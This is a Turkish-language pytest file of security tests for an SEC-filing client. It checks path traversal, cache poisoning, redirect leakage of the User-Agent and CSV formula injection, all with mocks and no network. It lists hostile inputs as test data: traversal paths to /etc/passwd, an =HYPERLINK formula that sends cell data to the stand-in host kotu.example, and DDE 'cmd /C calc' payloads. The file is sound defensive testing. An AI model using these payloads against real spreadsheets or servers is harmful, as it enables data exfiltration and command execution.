"""Saldırı testleri — SEC istemcisi, önbellek, dosya yolları ve CSV (SEC-07, SEC-09, SEC-17,
denetim §3 yol geçişi / CSV enjeksiyonu, RT-02).

Testler ağa çıkmaz: SEC yerine sahte fetcher, httpx yerine ``MockTransport``. ``finsight.jobs``
SQLAlchemy'yi içe aktardığı için ``store_document`` ve süreçler arası hız sınırı testleri
SQLAlchemy yoksa atlanır (kullanıcının bilgisayarında koşar); diğerleri bulutta koşar.
"""

from __future__ import annotations

import json
import os
import pathlib
import subprocess
import sys
import time

import pytest

from finsight.rate_limiter import RateLimiter
from finsight.sec_client import FileCache, HttpxFetcher, SecClient
from finsight.views import export_csv

from .attack_support import xfail_until

BACKEND = pathlib.Path(__file__).resolve().parents[2]
UA = "FinSight-AI KirmiziTakim test@example.com"
SUBMISSIONS = "https://data.sec.gov/submissions/CIK0000000001.json"


class Clock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def sleep(self, seconds: float) -> None:
        self.now += max(seconds, 0.0)


class ScriptedFetcher:
    """Her URL için sırayla yanıt döndüren sahte SEC (ağ yok)."""

    def __init__(self, responses: list[tuple[int, bytes]]) -> None:
        self.responses = list(responses)
        self.calls: list[str] = []

    def __call__(self, url: str, headers: dict) -> tuple[int, bytes]:
        self.calls.append(url)
        return self.responses.pop(0) if len(self.responses) > 1 else self.responses[0]


def _client(fetcher, cache=None, limiter=None, clock=None) -> SecClient:
    clock = clock or Clock()
    return SecClient(UA, fetcher=fetcher, cache=cache, max_retries=0,
                     limiter=limiter or RateLimiter(8, clock=clock, sleep=clock.sleep),
                     sleep=clock.sleep)


# --------------------------------------------------------------------------- yol geçişi


@pytest.mark.parametrize("url", ["https://data.sec.gov/../../../../etc/passwd",
                                 "..\\..\\windows\\win.ini", "/etc/passwd", "a/" * 200])
def test_filecache_path_stays_inside_cache_dir(tmp_path, url):
    """Denetim §3 (yol geçişi) kontrol saldırısı — URL'de ``../`` ile önbellek dışına dosya
    yazdırmak. Hedef: ``FileCache.set/_path``. Beklenen savunma (bugün de var): dosya adı
    SHA-256 → her zaman önbellek klasörünün içinde."""
    cache = FileCache(str(tmp_path / "cache"))
    cache.set(url, b"x")
    written = [p for p in tmp_path.rglob("*") if p.is_file()]
    assert len(written) == 1
    assert written[0].parent == tmp_path / "cache"
    assert cache.get(url) == b"x"


def test_store_document_primary_document_traversal_blocked(tmp_path):
    """Denetim §3 kontrol — ``primary_document = "../../../evil.htm"`` ile belge klasörü
    dışına yazmak. Beklenen savunma (bugün de var): ``os.path.basename``."""
    pytest.importorskip("sqlalchemy")
    from finsight.jobs import store_document

    base = tmp_path / "docs"
    meta = store_document(b"<html/>", "320193", "0000320193-25-000001", "../../../evil.htm",
                          documents_dir=str(base))
    assert meta["local_path"] is not None
    assert pathlib.Path(meta["local_path"]).resolve().is_relative_to(base.resolve())
    assert not (tmp_path / "evil.htm").exists()


def test_rt02_store_document_accession_traversal_blocked(tmp_path):
    """RT-02 (kırmızı takım; SEC-09 zinciri) — ``accession_no`` ve ``cik`` SEC JSON'undan gelir
    ve doğrulanmadan yola eklenir. Zehirlenmiş önbellek (SEC-09) veya araya giren vekil
    ``accessionNumber: "../../../../tmp/x"`` döndürürse belge klasör dışına yazılır.
    Beklenen savunma: yol belge klasörünün içinde kalır (veya ``local_path is None``)."""
    pytest.importorskip("sqlalchemy")
    from finsight.jobs import store_document

    base = tmp_path / "a" / "b" / "docs"
    meta = store_document(b"<html/>", "320193", "../../../../owned", "x.htm",
                          documents_dir=str(base))
    path = meta["local_path"]
    assert path is None or pathlib.Path(path).resolve().is_relative_to(base.resolve()), path


# --------------------------------------------------------------------------- SEC-09


def test_sec09_html_error_page_not_cached_for_json_url(tmp_path):
    """SEC-09 (CWE-345) — Saldırganın amacı (veya bakım sayfası döndüren vekil): JSON URL'si
    için 200 + HTML gövdesiyle önbelleği zehirlemek; uygulama TTL dolana (Aşama 4'te belgeler
    için süresiz) kadar bozuk yanıtla çalışır. Yük: ``(200, b"<html>bakim</html>")``.
    Beklenen savunma: hata verir, önbelleğe YAZILMAZ ve ikinci çağrı SEC'e yeniden gider."""
    cache = FileCache(str(tmp_path / "cache"))
    fetcher = ScriptedFetcher([(200, b"<html>bakim</html>"), (200, b'{"cik": "1"}')])
    client = _client(fetcher, cache=cache)
    with pytest.raises(Exception):  # noqa: B017 - hangi hata türü olduğu önemli değil
        client.submissions(1)
    assert cache.get(SUBMISSIONS) is None, "bozuk gövde önbelleğe yazıldı"
    assert client.submissions(1) == {"cik": "1"}
    assert len(fetcher.calls) == 2


def test_sec09_valid_json_is_cached(tmp_path):
    """SEC-09 yanlış pozitif kontrolü — geçerli JSON önbelleğe yazılır, ikinci çağrı ağa
    çıkmaz."""
    cache = FileCache(str(tmp_path / "cache"))
    fetcher = ScriptedFetcher([(200, b'{"cik": "1"}')])
    client = _client(fetcher, cache=cache)
    assert client.submissions(1) == {"cik": "1"} == client.submissions(1)
    assert len(fetcher.calls) == 1


# --------------------------------------------------------------------------- SEC-17 yönlendirme


def test_sec17_redirect_off_sec_gov_does_not_leak_user_agent(monkeypatch):
    """SEC-17 (CWE-601/CWE-200) — Saldırganın amacı: SEC (veya araya giren vekil) yanıtındaki
    ``Location: https://kotu.example/...`` yönlendirmesiyle kullanıcının adını ve e-postasını
    içeren ``User-Agent`` başlığını ele geçirmek. Ağ yok: ``httpx.MockTransport``.
    Beklenen savunma: ``kotu.example``'a User-Agent'lı istek gitmez.
    Durum: HEAD'de açıktı (``follow_redirects=True``); çalışma ağacında kapatıldı."""
    httpx = pytest.importorskip("httpx")
    leaked: list[str] = []

    def handler(request):
        if request.url.host.endswith("sec.gov"):
            return httpx.Response(302, headers={"Location": "https://kotu.example/steal"})
        leaked.append(request.headers.get("user-agent", ""))
        return httpx.Response(200, content=b"{}")

    real_client = httpx.Client

    class MockedClient(real_client):
        def __init__(self, *args, **kwargs):
            kwargs["transport"] = httpx.MockTransport(handler)
            super().__init__(*args, **kwargs)

    monkeypatch.setattr(httpx, "Client", MockedClient)
    fetcher = HttpxFetcher()
    try:
        fetcher(SUBMISSIONS, {"User-Agent": UA})
    except Exception:  # noqa: S110 - reddetmek de kabul edilir
        pass
    assert not any("@" in ua for ua in leaked), f"UA sızdı: {leaked}"


# --------------------------------------------------------------------------- SEC-07


def test_sec07_429_pauses_other_clients_sharing_limiter():
    """SEC-07 (CWE-799) — Saldırganın amacı (veya yoğun kullanım): bir istek 429 aldıktan sonra
    aynı süreçteki diğer işlerin SEC'e istek göndermeye devam ederek IP engelini uzatması.
    Senaryo: A istemcisi 429 alır; aynı hız sınırlayıcıyı paylaşan B istemcisi hemen istek
    atar. Beklenen savunma: B'nin isteği en az 1 sn (sahte saat) bekletilir."""
    clock = Clock()
    limiter = RateLimiter(8, clock=clock, sleep=clock.sleep)
    a = _client(ScriptedFetcher([(429, b"")]), limiter=limiter, clock=clock)
    b = _client(ScriptedFetcher([(200, b"{}")]), limiter=limiter, clock=clock)
    with pytest.raises(Exception):  # noqa: B017
        a.get_bytes("https://data.sec.gov/a.json")
    before = clock.now
    b.get_bytes("https://data.sec.gov/b.json")
    assert clock.now - before >= 1.0, f"B yalnızca {clock.now - before:.3f} sn bekledi"


_LIMITER_PROC = """
import sys, time, json
sys.path.insert(0, {backend!r})
from finsight import jobs
limiter = jobs.shared_limiter()
start = {start!r}
while time.time() < start:
    time.sleep(0.005)
stamps = []
for _ in range({n}):
    limiter.acquire()
    stamps.append(time.time())
print(json.dumps(stamps))
"""


def _max_in_window(stamps: list[float], window: float = 1.0) -> int:
    stamps = sorted(stamps)
    best, j = 0, 0
    for i, t in enumerate(stamps):
        while stamps[j] <= t - window:
            j += 1
        best = max(best, i - j + 1)
    return best


def test_sec07_two_processes_share_sec_rate_limit(tmp_path):
    """SEC-07 — Saldırgan profili A4: ``uvicorn`` sunucusu + ``python -m finsight.ingest`` CLI
    (veya Aşama 4 ``finsight.refresh``) aynı anda. Her süreç kendi ``shared_limiter()``'ını
    kullanır. Yük: iki gerçek süreç, her biri 16 istek hakkı ister. Beklenen savunma: herhangi
    bir 1 sn'lik pencerede toplam ≤ 9 istek (8 rps + zamanlama toleransı). Süre ≈ 3–5 sn."""
    pytest.importorskip("sqlalchemy")
    env = dict(os.environ, SEC_CACHE_DIR=str(tmp_path / "cache"), SEC_MAX_RPS="8",
               FINSIGHT_DISABLE_DOTENV="1")
    start = time.time() + 3.0
    code = _LIMITER_PROC.format(backend=str(BACKEND), start=start, n=16)
    procs = [subprocess.Popen([sys.executable, "-c", code], stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, text=True, env=env, cwd=str(tmp_path))
             for _ in range(2)]
    stamps: list[float] = []
    for p in procs:
        out, err = p.communicate(timeout=60)
        if p.returncode != 0:
            pytest.fail(f"alt süreç hata verdi: {err[-500:]}")
        stamps += json.loads(out.strip().splitlines()[-1])
    peak = _max_in_window(stamps)
    assert peak <= 9, f"1 sn'lik pencerede {peak} SEC isteği (sınır 8)"


# --------------------------------------------------------------------------- CSV


CSV_PAYLOADS = ['=HYPERLINK("https://kotu.example/?d="&A1,"tikla")', "+cmd|' /C calc'!A0",
                "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0", "\t=1+1", "\r=1+1"]


@xfail_until("CSV-DID", "denetim §3 önerisi: formül önekli metin hücreleri etkisizleştirilmeli")
@pytest.mark.parametrize("payload", CSV_PAYLOADS)
def test_csv_formula_injection_neutralized(payload):
    """Denetim §3 (CWE-1236, derinlemesine savunma) — Bugün serbest metin dışa aktarılmıyor;
    ileride şirket adı / risk başlığı eklenirse saldırgan (A2) 10-K'ya ``=HYPERLINK(...)``
    koyarak Excel'de veri sızdırabilir. Hedef: ``views.export_csv``. Beklenen savunma:
    ``= + - @ \\t \\r`` ile başlayan METİN hücreleri ``'`` önekiyle yazılır."""
    text = export_csv([{"label": payload, "value": 1.0}])
    import csv
    import io

    rows = list(csv.reader(io.StringIO(text.lstrip("﻿"))))
    header, row = rows[0], rows[1]
    cell = row[header.index("label")]
    assert cell.startswith("'"), f"formül etkisizleştirilmedi: {cell!r}"


def test_csv_negative_numbers_not_mangled():
    """CSV-DID yanlış pozitif kontrolü — sayısal negatif değerler (``-1250``) ``'`` öneki
    ALMAMALI; aksi halde Excel'de sayı metne döner."""
    text = export_csv([{"label": "Net kâr", "value": -1250.0}])
    assert "-1250" in text and "'-1250" not in text
